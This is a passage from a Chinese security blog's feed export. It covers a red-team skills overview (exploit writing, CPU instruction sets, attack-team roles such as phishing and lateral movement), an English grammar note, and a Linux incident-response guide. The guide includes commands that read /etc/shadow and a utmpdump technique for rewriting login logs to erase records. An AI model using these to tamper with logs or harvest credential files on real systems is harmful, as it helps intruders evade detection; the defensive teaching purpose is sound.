编写PoC或EXP等高级利用</h3><p>在前述“进阶能力”中的“（三）编写PoC或EXP等利用”中，我们已经介绍了PoC和EXP的概念，这里不再累述。相比于针对Web应用和智能硬件&#x2F;IoT设备编写PoC或EXP，针对各种类型的操作系统和安全设备编写PoC或EXP要更加困难，属于高阶能力。</p><p>高阶能力中，比较被关注的几个操作系统和设备包括：Windows、Android、iOS、Linux、macOS、网络安全设备。</p><h4 id="（1）-Windows"><a href="#（1）-Windows" class="headerlink" title="（1） Windows"></a>（1） Windows</h4><p>由微软公司开发的个人电脑操作系统。</p><p>在本文此处，Windows代指能够在Windows操作系统上找到漏洞并利用漏洞编写PoC或EXP的能力。</p><h4 id="（2）-Android"><a href="#（2）-Android" class="headerlink" title="（2） Android"></a>（2） Android</h4><p>由Google公司和开放手机联盟领导及开发的操作系统，主要使用于移动设备，如智能手机和平板电脑。</p><p>在本文中，Android代指能够在Android操作系统上找到漏洞并利用漏洞编写PoC或EXP的能力。</p><h4 id="（3）-iOS"><a href="#（3）-iOS" class="headerlink" title="（3） iOS"></a>（3） iOS</h4><p>由苹果公司开发的移动操作系统，主要使用于iPhone、iPod touch、iPad上。</p><p>在本文中，iOS代指能够在iOS操作系统上找到漏洞并利用漏洞编写PoC或EXP的能力。</p><h4 id="（4）-Linux"><a href="#（4）-Linux" class="headerlink" title="（4） Linux"></a>（4） Linux</h4><p>主要使用于服务器的操作系统， Ubnutu、CentOS等均属基于Linux内核基础上开发的操作系统。</p><p>在本文中，Linux代指能够在Linux操作系统上找到漏洞并利用漏洞编写PoC或EXP的能力。</p><h4 id="（5）-macOS"><a href="#（5）-macOS" class="headerlink" title="（5） macOS"></a>（5） macOS</h4><p>由苹果公司开发的操作系统，主要运用于Macintosh系列计算机。macOS的架构与Windows不同，很多针对Windows的计算机病毒在macOS上都无法攻击成功。</p><p>在本文中，macOS代指能够在macOS操作系统上找到漏洞并利用漏洞编写PoC或EXP的能力。</p><h4 id="（6）-网络安全设备"><a href="#（6）-网络安全设备" class="headerlink" title="（6） 网络安全设备"></a>（6） 网络安全设备</h4><p>在实战化环境中，经常会遇到的网络安全设备包括IP协议密码机、安全路由器、线路密码机、防火墙、安全服务器、公开密钥基础设施（PKI)系统、授权证书（CA)系统、安全操作系统、防病毒软件、网络&#x2F;系统扫描系统、入侵检测系统、网络安全预警与审计系统等。</p><p>网络安全设备本身也会存在各种各样的安全漏洞，在近年来的实战攻防演习中，受到越来越多的重视和利用。</p><p>在本文中，网络安全设备代指能够在各类网络安全设备中找到漏洞并利用漏洞编写PoC或EXP的能力。</p><h3 id="（七）-掌握CPU指令集"><a href="#（七）-掌握CPU指令集" class="headerlink" title="（七） 掌握CPU指令集"></a>（七） 掌握CPU指令集</h3><p>CPU指令集，即CPU中用来计算和控制计算机系统的一套指令的集合。每一种不同的CPU在设计时都会有一系列与其他硬件电路相配合的指令系统。指令系统包括指令格式、寻址方式和数据形式。一台计算机的指令系统反应了该计算机的全部功能。机器类型不同，其指令集也不同。而白帽子对CPU指令集的掌握程度，将直接决定白帽子进行系统层漏洞挖掘与利用的能力水平。本文指掌握不同架构下的底层程序分析。</p><p>目前，最为常见的CPU指令集包括x86、MIPS、ARM和PowerPC。</p><h4 id="（1）-x86"><a href="#（1）-x86" class="headerlink" title="（1） x86"></a>（1） x86</h4><p>x86一般指Intel x86。x86指令集是Intel为其CPU专门开发的指令集合。</p><p>通过分析x86指令集可以找到intel下相关软件或系统的运行机制，从而通过指令实现底层攻击。</p><h4 id="（2）-MIPS"><a href="#（2）-MIPS" class="headerlink" title="（2） MIPS"></a>（2） MIPS</h4><p>MIPS（Microcomputer without Interlocked Pipeline Stages）的含义是无互锁流水级微处理器，该技术是MIPS公司（著名芯片设计公司，）设计开发的一系列精简的指令系统计算结构，最早是在80年代初期由斯坦福(Stanford)大学Hennessy教授领导的研究小组研制出来的。由于其授权费用低，因此被Intel外的大多数厂商使用。</p><p>通过分析MIPS指令集可以找到除Intel外大多厂商（多见于工作站领域）的软件或系统运行机制，从而通过指令实现底层攻击。</p><h4 id="（3）-ARM"><a href="#（3）-ARM" class="headerlink" title="（3） ARM"></a>（3） ARM</h4><p>ARM（Advanced RISC Machines），即ARM处理器, 是英国Acorn公司设计的，低功耗的第一款RISC（Reduced Instruction Set Computer，精简指令集计算机）微处理器。</p><p>在本文中，ARM指ARM指令集。ARM指令集是指计算机ARM操作指令系统。ARM指令集可以分为跳转指令、数据处理指令、程序状态寄存器处理指令、加载&#x2F;存储指令、协处理器指令和异常产生指令六大类。</p><h4 id="（4）-PowerPC"><a href="#（4）-PowerPC" class="headerlink" title="（4） PowerPC"></a>（4） PowerPC</h4><p>PowerPC（Performance Optimization With Enhanced RISC-Performance Computing）是一种精简指令集架构的中央处理器，其基本的设计源自IBM的POWER架构。POWER是1991年，Apple、IBM、Motorola组成的AIM联盟所发展出的微处理器架构。PowerPC 处理器有广泛的实现范围，包括从高端服务器 CPU（如Power4） 到嵌入式 CPU 市场（如任天堂游戏机）。但苹果公司自2005年起，旗下计算机产品转用Intel CPU。</p><h3 id="（八）-团队协作"><a href="#（八）-团队协作" class="headerlink" title="（八） 团队协作"></a>（八） 团队协作</h3><p>随着实战攻防演习实践的不断深入，防守方的整体能力持续提升。这就使得白帽子单凭强大的个人能力单打独斗取得胜利的希望越来越小。而由3~5人组成的攻击小队，通过分工协作的方式高效完成攻击行动的模式已经越来越成熟。而对于白帽子来说，是否拥有团队协作的作战经验，在团队中扮演什么样的角色，也是白帽子实战化能力的重要指标。</p><p>团队作战，成功的关键的是协作与配合。通常来说，每只攻击队的成员都会有非常明确的分工和角色。在实战攻防演习实践中，攻击队比较常见的角色分工主要有6种，分别是：行动总指挥、情报收集人员、武器装备制造人员、打点实施人员、社工钓鱼人员和内网渗透人员。</p><h4 id="（1）-行动总指挥"><a href="#（1）-行动总指挥" class="headerlink" title="（1） 行动总指挥"></a>（1） 行动总指挥</h4><p>通常是攻击队中综合能力最强的人，需要有较强的组织意识、应变能力和丰富的实战经验，负责策略制定、任务分发、进度把控等。</p><h4 id="（2）-情报收集人员"><a href="#（2）-情报收集人员" class="headerlink" title="（2） 情报收集人员"></a>（2） 情报收集人员</h4><p>负责情报侦察和信息收集，收集内容包括但不限于：目标系统的组织架构、IT资产、敏感信息泄露、供应商信息等。</p><h4 id="（3）-武器装备制造人员"><a href="#（3）-武器装备制造人员" class="headerlink" title="（3） 武器装备制造人员"></a>（3） 武器装备制造人员</h4><p>负责漏洞挖掘及工具编写，是攻击队的核心战斗力量，不仅要能找到漏洞并利用漏洞，还要力求在不同环境下达到稳定、深入的漏洞利用。</p><h4 id="（4）-打点实施人员"><a href="#（4）-打点实施人员" class="headerlink" title="（4） 打点实施人员"></a>（4） 打点实施人员</h4><p>负责获取接入点，进行Web渗透等。找到薄弱环节后，利用漏洞或社工等方法，获取外网系统控制权限，之后寻找和内网连通的通道，建立据点（跳板）。</p><h4 id="（5）-社工钓鱼人员"><a href="#（5）-社工钓鱼人员" class="headerlink" title="（5） 社工钓鱼人员"></a>（5） 社工钓鱼人员</h4><p>负责社工攻击。利用人的安全意识不足或安全能力不足等弱点，实施社会工程学攻击，通过钓鱼邮件或社交平台等进行诱骗，进而成功打入内网。</p><h4 id="（6）-内网渗透人员"><a href="#（6）-内网渗透人员" class="headerlink" title="（6） 内网渗透人员"></a>（6） 内网渗透人员</h4><p>负责进入内网后的横向移动。利用情报收集人员的情报结合其他弱点来进行横向移动，扩大战果。尝试突破核心系统权限，控制核心任务，获取核心数据，最终完成目标突破工作。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>913</title>
      <link href="/2022/09/13/0913/"/>
      <url>/2022/09/13/0913/</url>
      
        <content type="html"><![CDATA[<h3 id="宾语从句一共有-5-中形式"><a href="#宾语从句一共有-5-中形式" class="headerlink" title="宾语从句一共有 5 中形式"></a>宾语从句一共有 5 中形式</h3><ol><li>介宾<br>介宾一般是出现在不及物动词中，当不及物动词后跟了宾语，又将宾语扩展成从句时，那么这个从句就叫做介词宾语从句。S + Vi +介词 + O<br>例：I think of <strong>what I can do</strong>.</li></ol><p>动宾<br>动宾又分为两种情况，单及物动词下的动宾以及双及物动词下的动宾。</p><p>单及物动词之动宾<br>单及物动词又分为是否存在宾补的情况<br>2. 主谓宾 形式的动宾<br>S + Vt + O -&gt;<strong>S + Vt + 宾语从句</strong><br>例如：I think (that) you are the best.<br>3. 主谓宾补形式的动宾<br>S + Vt + O + Oc -&gt;<strong>S + Vt + 宾语从句 +Oc</strong><br>例如：I think that we learn Engilsh well import. import 是宾语补语</p><p>双及物动词后面一般都跟两个宾语，直接宾语和间接宾语，而间接宾语和直接宾语都可以转换成宾语从句。<br>S + Vt + IO + DO -&gt; S+Vt+间接宾语+直接宾语：<br>4. S + Vt + IO + DO -&gt; S+Vt+间接宾语从句+DO<br>5. S + Vt + IO + DO -&gt; S+Vt+IO +直接宾语</p><p>例如：<br>原句：I will give you a gift.<br>间接宾语从句：I will give whoever comes first a gift.<br>直接宾语从句：I will give you whatever you want.<br>双宾语从句：I will give whoever comes first whatever he or she wants.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux应急响应</title>
      <link href="/2022/04/07/linux-ying-ji-xiang-ying/"/>
      <url>/2022/04/07/linux-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ufofly/picgo/master/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.png"></p><h1 id="1-账户安全"><a href="#1-账户安全" class="headerlink" title="1. 账户安全"></a>1. 账户安全</h1><p>先查看基础用户信息文件(&#x2F;etc&#x2F;passwd，&#x2F;etc&#x2F;shadow，&#x2F;etc&#x2F;group)</p><p><strong>&#x2F;etc&#x2F;shadow 字段说明</strong></p><p><code>登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</code></p><p>1）“登录名”是与&#x2F;etc&#x2F;passwd文件中的登录名相一致的用户账号<br>2）“口令”字段存放的是加密后的用户口令字，如果为空，则对应用户没有口令，登录时不需要口令；<br>星号代表帐号被锁定；<br>双叹号表示这个密码已经过期了。<br>$6$开头的，表明是用SHA-512加密的，<br>$1$ 表明是用MD5加密的<br>$2$ 是用Blowfish加密的<br>$5$ 是用 SHA-256加密的。<br>3）“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。<br>4）“最小时间间隔”指的是两次修改口令之间所需的最小天数。<br>5）“最大时间间隔”指的是口令保持有效的最大天数。<br>6）“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。<br>7）“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。<br>8）“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</p><p>1、查询特权用户特权用户(uid 为0),sudo特权用户<br>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd<br>more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”</p><p>2、查询可以远程登录的帐号信息<br>awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow</p><p>3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限<br>more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”</p><p>4、查询空口令账号<br>awk -F: ‘length($2)&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;shadow</p><p>5、禁用或删除多余及可疑的帐号<br>usermod -L user    #禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头<br>userdel -r user    #将删除user用户，并且将&#x2F;home目录下的user目录一并删除<br>passwd -l username  #禁用账号，在shadow密码前面加两个感叹号 -u解除禁用<br>修改&#x2F;etc&#x2F;passwd，把表示密码的第二个字段中X改为其他任意的字符，该账号就不能登录。<br>修改&#x2F;etc&#x2F;passwd，把最后一个shell字段修改为&#x2F;sbin&#x2F;nologin。<br>修改&#x2F;etc&#x2F;shadow，在第二个密码字段前面加上一个！或者两个！！，该账号就不能登录，这个效果和锁定账号一样<br>修改&#x2F;etc&#x2F;shadow，在最后两个冒号之间加上数字“1”，表示该账号的密码自1970年1月1日起，过一天后立即过期，当然现在自然就不能登录了。</p><p>6、查询登录用户及登录时长<br>who     # 查看当前登录系统的所有用户（tty 本地登陆  pts 远程登录）<br>w       # 显示已经登录系统的所用用户，以及正在执行的指令<br>uptime  # 查看登陆多久、多少用户，负载状态<br>whoami  #查看与当前有效用户ID关联的用户名<br>lastlog #查看所有用户最后一次登录的时间：<br>last    #查看所有用户的登录注销信息及系统的启动、重启及关机事件<br>lastb   #查看用户错误的登录列表</p><p>last<br>#显示logged in表示用户还在登录</p><h1 id="pts表示从SSH远程登录"><a href="#pts表示从SSH远程登录" class="headerlink" title="pts表示从SSH远程登录"></a>pts表示从SSH远程登录</h1><h1 id="tty表示从控制台登录，就是在服务器旁边登录"><a href="#tty表示从控制台登录，就是在服务器旁边登录" class="headerlink" title="tty表示从控制台登录，就是在服务器旁边登录"></a>tty表示从控制台登录，就是在服务器旁边登录</h1><p>lastb</p><h1 id="ssh表示从SSH远程登录"><a href="#ssh表示从SSH远程登录" class="headerlink" title="ssh表示从SSH远程登录"></a>ssh表示从SSH远程登录</h1><h1 id="tty表示从控制台登录"><a href="#tty表示从控制台登录" class="headerlink" title="tty表示从控制台登录"></a>tty表示从控制台登录</h1><p>命令排查黑客什么时间登录的有的黑客登录时，会将&#x2F;var&#x2F;log&#x2F;wtmp文件删除或者清空，这样就无法使用last命令获得有用的信息了。在做系统加固的时候可以使用 chattr +a 对 &#x2F;var&#x2F;log&#x2F;wtmp 文件进行锁定，避免被黑客删除。</p><ol><li>linux的密码&#x2F;etc&#x2F;passwd中,只显示一个x,真正的密码放在&#x2F;etc&#x2F;shadow中</li><li>密码的三种状态<br><code>$</code>长度34个字符的经过md5混编的不可逆密码<br><code>!!</code> :两个叹号: 表示这个帐号目前没有密码，也不能用来登录，通常为一些系统帐号<br><code>*</code> : 星号,使此账号无法登入</li><li>如何临时关闭一个账号?<br>临时关闭（锁定）一个用户帐号，并不需要修改该用户的密码。只需要在&#x2F;etc&#x2F;shadow文件里属于该用户的行的第二个字段（密码）前面加上星号<code>*</code>就可以了。星号<code>*</code>指的是该用户不允许登录。当你想要把该用户恢复正常，只需要把星号“*”去掉就可以了，用户就可以恢复正常。</li></ol><h1 id="2-端口、进程、服务"><a href="#2-端口、进程、服务" class="headerlink" title="2.端口、进程、服务"></a>2.端口、进程、服务</h1><p><code>使用netstat -antulp网络连接命令，分析可疑端口、IP、PID</code></p><p>ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 查看下pid所对应的进程文件路径<br>file &#x2F;proc&#x2F;$PID&#x2F;exe  查看下pid所对应的进程文件路径<br>lsof -i:xx 查看某个端口是哪个进程打开的<br>fuser -n tcp xxx 查看端口xxx对应的进程pid<br>lsof -p xxx  根据pid查看进程<br>lsof -c sshd  通过服务名查看该进程打开的文件<br>ps -p PID -o lstart 查看pid的启动事件点<br>kill -9  xxx  根据pid强行停止程<br>pkill -kill -t pts&#x2F;1  根据连接终端类型踢掉用户<br>netstat -nat | awk ‘{print $6}’| sort | uniq -c | sort -rn 统计tcp连接状态<br>netstat -anlp | grep 80 | grep tcp | awk ‘{print $5}’ | awk -F: ‘{print $1}’ | sort | uniq -c | sort -nr | head -n 20  查看tcp 80端口请求的ip<br>netstat -ntlp | grep 62333 | awk ‘{print $7}’ | cut -d&#x2F; -f1 根据端口显示进程号</p><h1 id="3-linux持久化驻留方法"><a href="#3-linux持久化驻留方法" class="headerlink" title="3.linux持久化驻留方法"></a>3.linux持久化驻留方法</h1><h2 id="检查是否存在可疑定时任务"><a href="#检查是否存在可疑定时任务" class="headerlink" title="检查是否存在可疑定时任务"></a>检查是否存在可疑定时任务</h2><p>枚举定时任务：crontab-l      </p><p>查看anacron异步定时任务：cat &#x2F;etc&#x2F;anacrontab</p><h2 id="检查是否存在可疑服务"><a href="#检查是否存在可疑服务" class="headerlink" title="检查是否存在可疑服务"></a>检查是否存在可疑服务</h2><p>枚举主机所有服务，查看是否有恶意服务：</p><p><code>centos6 service --status-all</code></p><p><code>centos7 systemctl list-units</code></p><h2 id="扫描是否存在恶意驱动"><a href="#扫描是否存在恶意驱动" class="headerlink" title="扫描是否存在恶意驱动"></a>扫描是否存在恶意驱动</h2><p>枚举&#x2F;扫描系统驱动：lsmod</p><p>安装chkrootkit 、rkhunter进行扫描</p><p><code>http://ftp.pangeia.com.br/download.htm</code></p><p><code>https://sourceforge.net/projects/rkhunter/</code></p><h2 id="ssh弱口令"><a href="#ssh弱口令" class="headerlink" title="ssh弱口令"></a>ssh弱口令</h2><h2 id="检查是否有被攻击痕迹"><a href="#检查是否有被攻击痕迹" class="headerlink" title="检查是否有被攻击痕迹"></a>检查是否有被攻击痕迹</h2><p>查询log主机登陆日志：</p><pre class="line-numbers language-none"><code class="language-none">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>定位有爆破的源IP：</p><pre class="line-numbers language-none"><code class="language-none">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破日志的用户名密码：</p><pre class="line-numbers language-none"><code class="language-none">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SSH爆破是Linux病毒最常用的传播手段，若存在弱密码的主机很容易被其他感染主机SSH爆破成功，从而再次感染病毒。</p><h1 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">日志默认存放位置：/var/log/日志配置位置：/etc/rsyslog.conf日志文件             说明/var/log/cron         记录了系统定时任务相关的日志/var/log/mailog     记录邮件信息/var/log/auth.log   包含系统授权信息，包括用户登录和使用的权限机制等/var/log/userlog    记录所有等级用户信息的日志/var/log/vsftpd.log 记录Linux <span class="token function">ftp</span> 日志/var/log/message     记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件/var/log/lastlog     记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看/var/log/btmp       记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看/var/log/wtmp         永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看/var/run/utmp         记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询/var/log/secure     记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录/var/log/faillog    记录系统登录不成功的账户信息，一般会被黑客删除。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、定位有多少IP在爆破主机的root帐号：    <span class="token function">grep</span> <span class="token string">"Failed password for root"</span> /var/log/secure <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print 11&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span>定位有哪些IP在爆破：<span class="token function">grep</span> <span class="token string">"Failed password"</span> /var/log/secure<span class="token operator">|</span><span class="token function">grep</span> -E -o <span class="token string">"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span><span class="token operator">|</span><span class="token function">uniq</span> -c爆破用户名字典是什么？<span class="token function">grep</span> <span class="token string">"Failed password"</span> /var/log/secure<span class="token operator">|</span>perl -e <span class="token string">'while(_=&lt;>)&#123; /for(.*?) from/; print "1\n";&#125;'</span><span class="token operator">|</span><span class="token function">uniq</span> -c<span class="token operator">|</span><span class="token function">sort</span> -nr<span class="token number">2</span>、登录成功的IP有哪些：   <span class="token function">grep</span> <span class="token string">"Accepted "</span> /var/log/secure <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print11&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span>登录成功的日期、用户名、IP：<span class="token function">grep</span> <span class="token string">"Accepted "</span> /var/log/secure <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print 1,2,3,9,$11&#125;'</span> <span class="token number">3</span>、增加一个用户kali日志：Jul <span class="token number">10</span> 00:12:15 localhost useradd<span class="token punctuation">[</span><span class="token number">2382</span><span class="token punctuation">]</span>: new group: <span class="token assign-left variable">name</span><span class="token operator">=</span>kali, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1001</span>Jul <span class="token number">10</span> 00:12:15 localhost useradd<span class="token punctuation">[</span><span class="token number">2382</span><span class="token punctuation">]</span>: new user: <span class="token assign-left variable">name</span><span class="token operator">=</span>kali, <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1001</span>, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1001</span>, <span class="token assign-left variable">home</span><span class="token operator">=</span>/home/kali, <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/bashJul <span class="token number">10</span> 00:12:58 localhost passwd: pam_unix<span class="token punctuation">(</span>passwd:chauthtok<span class="token punctuation">)</span>: password changed <span class="token keyword">for</span> kali<span class="token comment">#grep "useradd" /var/log/secure </span><span class="token number">4</span>、删除用户kali日志：Jul <span class="token number">10</span> 00:14:17 localhost userdel<span class="token punctuation">[</span><span class="token number">2393</span><span class="token punctuation">]</span>: delete user <span class="token string">'kali'</span>Jul <span class="token number">10</span> 00:14:17 localhost userdel<span class="token punctuation">[</span><span class="token number">2393</span><span class="token punctuation">]</span>: removed group <span class="token string">'kali'</span> owned by <span class="token string">'kali'</span>Jul <span class="token number">10</span> 00:14:17 localhost userdel<span class="token punctuation">[</span><span class="token number">2393</span><span class="token punctuation">]</span>: removed shadow group <span class="token string">'kali'</span> owned by <span class="token string">'kali'</span><span class="token comment"># grep "userdel" /var/log/secure</span><span class="token number">5</span>、su切换用户：Jul <span class="token number">10</span> 00:38:13 localhost su: pam_unix<span class="token punctuation">(</span>su-l:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user good by root<span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>sudo授权执行:<span class="token function">sudo</span> -lJul <span class="token number">10</span> 00:43:09 localhost sudo:    good <span class="token builtin class-name">:</span> <span class="token assign-left variable">TTY</span><span class="token operator">=</span>pts/4 <span class="token punctuation">;</span> <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/home/good <span class="token punctuation">;</span> <span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>root <span class="token punctuation">;</span> <span class="token assign-left variable">COMMAND</span><span class="token operator">=</span>/sbin/shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>utmp、wtmp、btmp文件</p><p>Linux用户登录信息放在三个文件中：</p><p>&#x2F;var&#x2F;run&#x2F;utmp：记录当前正在登录系统的用户信息，默认由who和w记录当前登录用户的信息，uptime记录系统启动时间；</p><p>&#x2F;var&#x2F;log&#x2F;wtmp：记录当前正在登录和历史登录系统的用户信息，默认由last命令查看；</p><p>&#x2F;var&#x2F;log&#x2F;btmp：记录失败的登录尝试信息，默认由lastb命令查看。</p><p>相关命令介绍</p><p>查看这三个日志文件的命令，分别是lastlog、last、lastb、ac、who、w、users、utmpdump。其中last、lastb、who、utmpdump可以通过指定参数而查看三个中的任意一个文件。</p><p><strong>1、lastlog</strong></p><p>列出所有用户最近登录的信息，或者指定用户的最近登录信息。lastlog引用的是&#x2F;var&#x2F;log&#x2F;lastlog文件中的信息，包括login-name、port、last login time。</p><pre class="line-numbers language-none"><code class="language-none"># lastlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2、last</strong></p><p>列出当前和曾经登入系统的用户信息，它默认读取的是&#x2F;var&#x2F;log&#x2F;wtmp文件的信息。输出的内容包括：用户名、终端位置、登录源信息、开始时间、结束时间、持续时间。注意最后一行输出的是wtmp文件起始记录的时间。当然也可以通过last -f参数指定读取文件，可以是&#x2F;var&#x2F;log&#x2F;btmp、&#x2F;var&#x2F;run&#x2F;utmp。</p><pre class="line-numbers language-none"><code class="language-none"># last<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3、lastb</strong></p><p>列出失败尝试的登录信息，和last命令功能完全相同，只不过它默认读取的是&#x2F;var&#x2F;log&#x2F;btmp文件的信息。当然也可以通过last -f参数指定读取文件，可以是&#x2F;var&#x2F;log&#x2F;wtmp、&#x2F;var&#x2F;run&#x2F;utmp。</p><pre class="line-numbers language-none"><code class="language-none"># lastb# lastb -F -f &#x2F;var&#x2F;log&#x2F;wtmp# lastb -F -f &#x2F;var&#x2F;log&#x2F;utmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>4、who</strong></p><p>查看当前登入系统的用户信息。其中who -m等效于who am i。</p><p>who命令强大的一点是，它既可以读取utmp文件也可以读取wtmp文件，默认没有指定FILE参数时，who查询的是utmp的内容。当然可以指定FILE参数，比如who -aH &#x2F;var&#x2F;log&#x2F;wtmp,则此时查看的是wtmp文件。</p><pre class="line-numbers language-none"><code class="language-none"># who# who -rH# who -q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>5、w</strong></p><p>查看当前登入系统的用户信息及用户当前的进程（而who命令只能看用户不能看进程）。该命令能查看的信息包括字系统当前时间，系统运行时间，登陆系统用户总数及系统1、5、10分钟内的平均负载信息。后面的信息是用户，终端，登录源，login time，idle time，JCPU，PCPU，当前执行的进程等。</p><p>w的信息来自两个文件：用户登录信息来自&#x2F;var&#x2F;run&#x2F;utmp，进程信息来自&#x2F;proc&#x2F;.</p><p><strong>6、users</strong></p><p>显示当前正在登入统的用户名。语法是users [OPTION]… [FILE]。如果未指定FILE参数则默认读取的是&#x2F;var&#x2F;run&#x2F;utmp，当然也可以指定通用相关文件&#x2F;var&#x2F;log&#x2F;wtmp，此时输出的就不是当前用户了。</p><pre class="line-numbers language-none"><code class="language-none"># users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>7、utmpdump</strong></p><p>utmpdump用于转储二进制日志文件到文本格式的文件以便查看，同时也可以修改二进制文件！！包括&#x2F;var&#x2F;run&#x2F;utmp、&#x2F;var&#x2F;log&#x2F;wtmp、&#x2F;var&#x2F;log&#x2F;btmp。语法为：utmpdump [options] [filename]。修改文件实际就可以抹除系统记录，所以一定要设置好权限，防止非法入侵。</p><p>例子：修改utmp或wtmp。由于这些都是二进制日志文件，你不能像编辑文件一样来编辑它们。取而代之是，你可以将其内容输出成为文本格式，并修改文本输出内容，然后将修改后的内容导入回二进制日志中。如下： </p><pre class="line-numbers language-none"><code class="language-none"># utmpdump &#x2F;var&#x2F;log&#x2F;utmp &gt; tmp_output.txt          #导出文件信息# utmpdump -r tmp_output.txt &gt; &#x2F;var&#x2F;log&#x2F;utmp       #导入到源文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>att&amp;ck</title>
      <link href="/2022/03/30/att-ck/"/>
      <url>/2022/03/30/att-ck/</url>
      
